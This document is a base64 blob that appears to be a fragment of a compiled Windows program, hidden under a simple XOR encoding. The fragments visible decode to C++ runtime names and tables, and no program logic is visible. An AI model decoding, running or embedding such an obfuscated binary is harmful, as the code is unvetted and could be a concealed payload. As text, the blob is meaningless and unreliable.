Fgd34hYHe+IWB2viFgeP4hYHr+IWB/fiFgcf4RYHJ+EWB0vhFgdv4RYHi+EWB9fhFgf74RYHD+AWByPgFgdT4BYHpPkWB0/gFgd74BYHn+AWB4vgFger4BYHSEh1dmRycz8XFxcXSEh0c3J0exdISGd2ZHR2excXFxdISGRjc3R2e3sXFxdISGN/fmR0dnt7FxdISHF2ZGN0dnt7FxdISGFydGN4ZXR2e3sXFxcXSEh0e2V0dnt7FxcXSEhydnV+FxdISGdjZSEjF0hIZXJkY2V+dGMXF0hIYnl2e35weXJzF2VyZGNlfnRjPxcXFzd5cmAXFxcXN3Nye3JjchcqFxcXKSkXFysrFxc2FxcXKioXFzYqFxdMShcXeGdyZXZjeGUXFxcXOikXFz0XFxc8PBcXOjoXFzoXFxc8FxcXMRcXFzopPRc4FxcXMhcXFysXFxcrKhcXKRcXFykqFxc7FxcXPz4XF2kXFxdJFxcXaxcXFzExFxdraxcXPSoXFzwqFxc6KhcXOCoXFzIqFxcpKSoXKysqFzEqFxdrKhcXSSoXF3dhcWN2dXtyMBcXF3dhdWN2dXtyMBcXF3dhdHZ7ezAXd2NuZ3J4cTAXFxcXd3t4dHZ7N2RjdmN+dDdwYnZlczAXFxcXd2RjZX55cDAXFxcXd2F1dmRyN3NyZGNlYnRjeGUwFxd3YXJ0Y3hlN3Nye3JjfnlwN3NyZGNlYnRjeGUwFxcXF3dzcnF2YntjN3R4eWRjZWJ0Y3hlN3R7eGRiZXIwFxcXd2R0dnt2ZTdzcntyY355cDdzcmRjZWJ0Y3hlMBcXFxd3YXJ0Y3hlN3R4eWRjZWJ0Y3hlN35jcmV2Y3hlMBcXF3dhcnRjeGU3c3JkY2VidGN4ZTd+Y3JldmN4ZTAXFxcXd2FydGN4ZTdhdXZkcjd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXd2F+ZWNidns3c35kZ3t2dHJ6cnljN3p2ZzAXF3dyfzdhcnRjeGU3dHh5ZGNlYnRjeGU3fmNyZXZjeGUwFxcXF3dyfzdhcnRjeGU3c3JkY2VidGN4ZTd+Y3JldmN4ZTAXd3J/N2FydGN4ZTdhdXZkcjd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXF3d0eGduN3R4eWRjZWJ0Y3hlN3R7eGRiZXIwFxd3YnNjN2VyY2JleX55cDAXd1JfF3dFQ0NeFxcXd3t4dHZ7N2FxY3Z1e3IwF3d7eHR2ezdhcWN2dXtyN3R4eWRjZWJ0Y3hlN3R7eGRiZXIwFzd5cmBMShcXN3Nye3JjckxKFxcXd3h6eX43dHZ7e2R+cDAXF3dne3Z0cnpyeWM3c3J7cmNyN3R7eGRiZXIwFxd3Z3t2dHJ6cnljN3Nye3JjckxKN3R7eGRiZXIwFxcXF3d6dnl2cHJzN2FydGN4ZTd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXFxd3enZ5dnByczdhcnRjeGU3c3JkY2VidGN4ZTd+Y3JldmN4ZTAXFxcXd3J/N2FydGN4ZTd0eGduN3R4eWRjZWJ0Y3hlN35jcmV2Y3hlMBcXF3dyfzdhcnRjeGU3YXV2ZHI3dHhnbjd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXd3NueXZ6fnQ3fnl+Y352e35tcmU3cXhlNzAXF3dzbnl2en50N3Zjcm9+YzdzcmRjZWJ0Y3hlN3F4ZTcwFxcXF3dhcnRjeGU3dHhnbjd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXF3dhcnRjeGU3YXV2ZHI3dHhnbjd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXFxcXd3p2eXZwcnM3YXJ0Y3hlN3R4Z243dHh5ZGNlYnRjeGU3fmNyZXZjeGUwFxd3e3h0dns3ZGN2Y350N2N/ZXJ2czdwYnZlczAXeGdyZXZjeGU3NTU3FxcXF3hncmV2Y3hlN3R4SHZgdn5jFxcXN0NuZ3I3U3JkdGV+Z2N4ZTAXFxc3VXZkcjdUe3ZkZDdTcmR0ZX5nY3hlN3ZjNz8XN1V2ZHI3VHt2ZGQ3VmVldm4wFxc3VHt2ZGQ3X35yZXZldH9uN1NyZHRlfmdjeGUwFxcXFzdUeHpne3JjcjdYdX1ydGM3W3h0dmN4ZTAXFxcRFxcRFxYXFwcXFBEXERUHE1JSUhISEhISIicXRxcXFxc/Ny9HTxAfFyAnJ0BHEBcXNzcfEBcXFx93f3d3d3cXF29nb29vbx8QHxAXEBcfHx8XFx8QHxcQHxcQFz8XeRdiF3sXexc+FxcXFxc/eWJ7ez4XFxcXFxcSFxfXHBcXFxcXFxcKFxfXExcXFxcXFxeBFxfXExcXFxcXFxeaFxfXHxcXFxcXFxeZFxfXHxcXFxcXFxeYFxfXHxcXFxcXFxeHFxfXHxcXFxcXFxeGFxfXHxcXFxcXFxeFFxfXHxcXFxcXFxeEFxfXHxcXFxcXFxejFRfXHxcXFxcXFxeiFRfXHxcXFxcXFxcbFxcXFBcXFx4XFxd6F2QXdBd4F2UXchdyFzkXcxd7F3sXFxdUeGVSb35jR2V4dHJkZBcXFxcXF2gWFgcXFxcXphYWBxcXFxcAPRYHRD0WB7kWFge5FhYHljwWB848FgfWLRYHxS0WBxcXFxf5FhYHwAEWBxQAFgfmMxYHUDIWB2EuFge5FhYHOCEWBxcXFxcXFxcXuRYWBxcXFxcHFRYHFxcXF+AWFge5FhYHsRYWB5sWFge5FhYHFhcXFwEXFxcVFxcXFRcXFxQXFxcVFxcXExcXFw8XFxcSFxcXGhcXFxEXFxceFxcXEBcXFxsXFxcfFxcXGxcXFx4XFxcbFxcXHRcXFxAXFxccFxcXHxcXFxsXFxcBFxcXGhcXFwEXFxcYFxcXFRcXFwcXFxcaFxcXBhcXFwUXFxcFFxcXFRcXFzYXFxcaFxcXIhcXFxUXFxdWFxcXGhcXF1QXFxcVFxcXRxcXFwYXFxdFFxcXGhcXF0QXFxcaFxcXQBcXFwEXFxdOFxcXHBcXF3sXFxcaFxcXehcXFzcXFxdnFxcXCxcXF2UXFxceFxcXlxcXFx0XFxeWFxcXHRcXF5UXFxceFxcXlBcXFwEXFxeTFxcXGhcXF4YXFxc+FxcXiRcXFxoXFxe2FxcXFRcXF7MXFxccFxcXsBcXFxoXFxegFxcXBhcXF9kXFxcVFxcXwBcXFxwXFxcPEBcXGxcXF15ZURd+eXEXWVZZF3l2eRdZVlk/RFlWWT4XFxd5dnk/ZHl2eT4XFxdZVlk/XllTPhcXFxd5dnk/fnlzPhcXFxdyPCcnJxcXF0RieRdaeHkXQ2JyF0BycxdDf2IXUWV+F0R2YxdEYnlzdm4XF1p4eXN2bhcXQ2JyZHN2bhdAcnN5cmRzdm4XFxdDf2JlZHN2bhcXFxdRZX5zdm4XF0R2Y2Jlc3ZuFxcXF112eRdRcnUXWnZlF1ZnZRdadm4XXWJ5F11iexdWYnAXRHJnF1h0YxdZeGEXU3J0F112eWJ2ZW4XUXJ1ZWJ2ZW4XFxcXWnZldH8XFxdWZ2V+excXF11ieXIXFxcXXWJ7bhcXFxdWYnBiZGMXF0RyZ2NyenVyZRcXF1h0Y3h1cmUXWXhhcnp1cmUXFxcXU3J0cnp1cmUXFxcXVloXF0daFxdaWjhzczhubhcXFxdzc3NzOzdaWlpaN3NzOzdubm5uF19fLXp6LWRkFxcXF0QXYhd5FxcXWhd4F3kXFxdDF2IXchcXF0AXchdzFxcXQxd/F2IXFxdRF2UXfhcXF0QXdhdjFxcXRBdiF3kXcxd2F24XFxcXF1oXeBd5F3MXdhduFxcXFxdDF2IXchdkF3MXdhduFxcXQBdyF3MXeRdyF2QXcxd2F24XFxdDF38XYhdlF2QXcxd2F24XFxcXF1EXZRd+F3MXdhduFxcXFxdEF3YXYxdiF2UXcxd2F24XFxcXF10Xdhd5FxcXURdyF3UXFxdaF3YXZRcXF1YXZxdlFxcXWhd2F24XFxddF2IXeRcXF10XYhd7FxcXVhdiF3AXFxdEF3IXZxcXF1gXdBdjFxcXWRd4F2EXFxdTF3IXdBcXF10Xdhd5F2IXdhdlF24XFxdRF3IXdRdlF2IXdhdlF24XFxcXF1oXdhdlF3QXfxcXF1YXZxdlF34XexcXF10XYhd5F3IXFxcXF10XYhd7F24XFxcXF1YXYhdwF2IXZBdjFxcXFxdEF3IXZxdjF3IXehd1F3IXZRcXF1gXdBdjF3gXdRdyF2UXFxdZF3gXYRdyF3oXdRdyF2UXFxcXF1MXchd0F3IXehd1F3IXZRcXFxcXVhdaFxcXFxdHF1oXFxcXF1oXWhc4F3MXcxc4F24XbhcXFxcXcxdzF3MXcxc7FzcXWhdaF1oXWhc3F3MXcxc7FzcXbhduF24XbhcXF18XXxctF3oXehctF2QXZBcXFxcXchd5FzoXQhdEFxcXFxcXF1fsFgdT7BYHX+wWB1vsFgdH7BYHQ+wWB0/sFgdL7BYHc+wWB3vsFgdj7BYHl+wWB5vsFgeD7BYHt+wWB7PsFge/7BYHu+wWB6fsFgej7BYHr+wWB6vsFgfX7BYH0+wWB9/sFgfb7BYHx+wWB8/sFgfz7BYH++wWB6fsFgfj7BYH6+wWBxPrFgcb6xYHD+sWBzfrFgc76xYHL+sWByvrFgdX6xYHW+sWB3frFgcWFxcXFxcXF3vrFgdj6xYHa+sWB5PrFgeb6xYHg+sWB4vrFgez6xYHo+sWB9PrFgfD6xYH/+sWB+vrFgcb6hYHN+oWBz/qFgcn6hYHL+oWB1fqFgdf6hYHR+oWB0/qFgd36hYHf+oWB2fqFgdv6hYHl+oWB4fqFgez6hYHp+oWB1fqFger6hYH3+oWB8PqFgfz6hYH7+oWBx/pFgcL6RYHJ+kWBy/pFgdX6RYHQ+kWB2vpFgeH6RYHFxcXF08XFQdT+BYHjxcVB8cXFQcPFhUHbxYVB9MWFQeX+BYHFxUVB1cVFQdrFRUHrxUVBx8UFQd3FBUHvxQVB+8UFQer+BYHGxMVBw8TFQd3ExUHdhdnF34XOhd6F2QXOhdgF34XeRc6F3QXeBdlF3IXOhdzF3YXYxdyF2MXfhd6F3IXOhd7FyYXOhcmFzoXJhcXF3YXZxd+FzoXehdkFzoXYBd+F3kXOhd0F3gXZRdyFzoXcRd+F3sXchc6F3sXJhc6FyUXOhclFxcXdhdnF34XOhd6F2QXOhdgF34XeRc6F3QXeBdlF3IXOhd7F3gXdBd2F3sXfhdtF3YXYxd+F3gXeRc6F3sXJhc6FyUXOhcmFxcXdhdnF34XOhd6F2QXOhdgF34XeRc6F3QXeBdlF3IXOhd7F3gXdBd2F3sXfhdtF3YXYxd+F3gXeRc6F3gXdRdkF3gXexdyF2MXchc6F3sXJhc6FyUXOhcnFxcXFxcXFxcXdhdnF34XOhd6F2QXOhdgF34XeRc6F3QXeBdlF3IXOhdnF2UXeBd0F3IXZBdkF2MXfxdlF3IXdhdzF2QXOhd7FyYXOhcmFzoXJRcXF3YXZxd+FzoXehdkFzoXYBd+F3kXOhd0F3gXZRdyFzoXZBdjF2UXfhd5F3AXOhd7FyYXOhcmFzoXJxcXF3YXZxd+FzoXehdkFzoXYBd+F3kXOhd0F3gXZRdyFzoXZBduF2QXfhd5F3EXeBc6F3sXJhc6FyUXOhcmFxcXFxd2F2cXfhc6F3oXZBc6F2AXfhd5FzoXdBd4F2UXchc6F2AXfhd5F2UXYxc6F3sXJhc6FyYXOhcnFxcXFxd2F2cXfhc6F3oXZBc6F2AXfhd5FzoXdBd4F2UXchc6F28XZBdjF3YXYxdyFzoXexclFzoXJhc6FycXFxd2F2cXfhc6F3oXZBc6F2AXfhd5FzoXZRdjF3QXeBdlF3IXOhd5F2MXYhdkF3IXZRc6F2AXfhd5F3MXeBdgFzoXexcmFzoXJhc6FycXFxcXF3YXZxd+FzoXehdkFzoXYBd+F3kXOhdkF3IXdBdiF2UXfhdjF24XOhdkF24XZBdjF3IXehdxF2IXeRd0F2MXfhd4F3kXZBc6F3sXJhc6FyYXOhcnFxcXFxdyF28XYxc6F3oXZBc6F2AXfhd5FzoXeRdjF2IXZBdyF2UXOhdzF34Xdhd7F3gXcBd1F3gXbxc6F3sXJhc6FyYXOhcnFxcXFxdyF28XYxc6F3oXZBc6F2AXfhd5FzoXeRdjF2IXZBdyF2UXOhdgF34XeRdzF3gXYBdkF2MXdhdjF34XeBd5FzoXexcmFzoXJhc6FycXFxcXF3YXcxdhF3YXZxd+FyQXJRcXFxcXeRdjF3MXexd7FxcXdhdnF34XOhd6F2QXOhdgF34XeRc6F3YXZxdnF3oXeBdzF3IXexc6F2UXYhd5F2MXfhd6F3IXOhd7FyYXOhcmFzoXJRcXFxcXYhdkF3IXZRckFyUXFxcXFxYXFxcHFxcXFhcXFwcXFxcWFxcXBxcXFxYXFxcHFxcXHxcXF1ByY0RuZGNyekN+enJHZXJ0fmRyVmRRfntyQ356chcXEBcXFwcXFxcUFxcXBxcXF1tUWnZnRGNlfnlwUm8XFxcUFxcXBxcXF1t4dHZ7cll2enJDeFtUXlMXFxcXBRcXF1ZnZ0d4e350blByY0dleHRyZGRDcmV6fnl2Y354eVpyY394cxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFzcXNxc3FzcXNxc3FzcXNxc3Fz8XPxc/Fz8XPxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxdfFwcXBxcHFwcXBxcHFwcXBxcHFwcXBxcHFwcXBxcHF5MXkxeTF5MXkxeTF5MXkxeTF5MXBxcHFwcXBxcHFwcXBxeWF5YXlheWF5YXlhcWFxYX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FQcIExcXswgVBzcTFxenCBUHNhMXF6sIFQc1ExcX3wgVBzQTFxfDCBUHMxMXF/cIFQcyExcX+wgVBzETFxfvCBUHMBMXFxM3FQc+ExcXBzcVBz0TFxcLNxUHPBMXFz83FQc7ExcXIzcVBzoTFxdbNxUHOBMXF083FQclExcXczcVByMTFxdnNxUHIhMXF2s3FQchExcXnzcVByATFxeDNxUHLxMXF7c3FQcuExcXuzcVBy0TFxevNxUHLBMXF9M3FQcpExcXxzcVBygTFxfLNxUHVxMXF/83FQdWExcX4zcVB1QTFxcXNhUHUxMXFw82FQdSExcXMzYVB1ETFxcnNhUHUBMXFys2FQdeExcXXzYVB10TFxdDNhUHXBMXF3c2FQdbExcXezYVB1kTFxdvNhUHWBMXF5M2FQdHExcXhzYVB0UTFxeLNhUHQRMXF782FQdAExcXozYVB00TFxfTNhUHchMXF8M2FQd8ExcX8zYVB3sTFxfjNhUHlhMXFxc1FQcWHxcXGzUVBxMfFxcrHBUHEB8XFw81FQceHxcXMzUVBx0fFxcnNRUHGx8XFys1FQcHHxcXXzUVBwQfFxdDNRUHAx8XF3c1FQcBHxcXezUVBw0fFxdvNRUHCh8XF4c1FQc7HxcXizUVBywfFxejNRUHKR8XF9c1FQdUHxcX2zUVB3wfFxfzNRUHFhsXF+M1FQcTGxcXFzQVBxAbFxcbNBUHHhsXFw80FQcdGxcXMzQVBxsbFxcnNBUHDRsXFys0FQcsGxcXQzQVB3wbFxd3NBUHFgcXF2c0FQcTBxcXazQVBxAHFxefNBUHHgcXF4M0FQcdBxcXtzQVBxsHFxe7NBUHDQcXF680FQcsBxcX0zQVBxYDFxfDNBUHEwMXF/c0FQcQAxcX+zQVBx4DFxfvNBUHHQMXFxMzFQcbAxcXBzMVBw0DFxcLMxUHLAMXFyMzFQcWDxcXUzMVBx4PFxdHMxUHHQ8XF0szFQcbDxcXfzMVBw0PFxdjMxUHLA8XF5szFQcWCxcXizMVBx4LFxe/MxUHHQsXF6MzFQcNCxcX1zMVBywLFxfPMxUHFjcXF/8zFQceNxcX4zMVBx03FxcXMhUHLDcXFxsyFQcWMxcXCzIVBx4zFxc/MhUHHTMXFyMyFQcsMxcXVzIVBxY/FxdHMhUHHj8XF0syFQcdPxcXfzIVBxY7FxdjMhUHHjsXF5cyFQcdOxcXmzIVBxYnFxePMhUHHicXF7MyFQcdJxcXpzIVBxYjFxerMhUHHiMXF98yFQcdIxcXwzIVBxYvFxf3MhUHHS8XF/syFQcWKxcX7zIVBx0rFxcTMRUHFlcXFwcxFQcdVxcXCzEVBx1TFxc/MRUHHV8XFyMxFQcdWxcXVzEVBx1HFxdbMRUHE2sXF08xFQcNaxcXfzEVB3YXZRcXFxcXdRdwFxcXFxd0F3YXFxcXF20Xfxc6F1QXXxdEFxcXFxd0F2QXFxcXF3MXdhcXFxcXcxdyFxcXFxdyF3sXFxcXF3IXeRcXFxcXchdkFxcXFxdxF34XFxcXF3EXZRcXFxcXfxdyFxcXFxd/F2IXFxcXF34XZBcXFxcXfhdjFxcXFxd9F3YXFxcXF3wXeBcXFxcXeRd7FxcXFxd5F3gXFxcXF2cXexcXFxcXZxdjFxcXFxdlF3gXFxcXF2UXYhcXFxcXfxdlFxcXFxdkF3wXFxcXF2QXZhcXFxcXZBdhFxcXFxdjF38XFxcXF2MXZRcXFxcXYhdlFxcXFxd+F3MXFxcXF3UXchcXFxcXZBd7FxcXFxdyF2MXFxcXF3sXYRcXFxcXexdjFxcXFxdxF3YXFxcXF2EXfhcXFxcXfxduFxcXFxd2F20XFxcXF3IXYhcXFxcXehd8FxcXFxd2F3EXFxcXF3wXdhcXFxcXcRd4FxcXFxd/F34XFxcXF3oXZBcXFxcXfBd8FxcXFxd8F24XFxcXF2QXYBcXFxcXYhdtFxcXFxdjF2MXFxcXF2cXdhcXFxcXcBdiFxcXFxdjF3YXFxcXF2MXchcXFxcXfBd5FxcXFxd6F2UXFxcXF2QXdhcXFxcXehd5FxcXFxdwF3sXFxcXF3wXeBd8FxcXZBduF2UXFxdzF34XYRcXFxcXFxd2F2UXOhdEF1YXFxd1F3AXOhdVF1AXFxd0F3YXOhdSF0QXFxd0F2QXOhdUF00XFxdzF3YXOhdTF1wXFxdzF3IXOhdTF1IXFxdyF3sXOhdQF0UXFxdxF34XOhdRF14XFxdxF2UXOh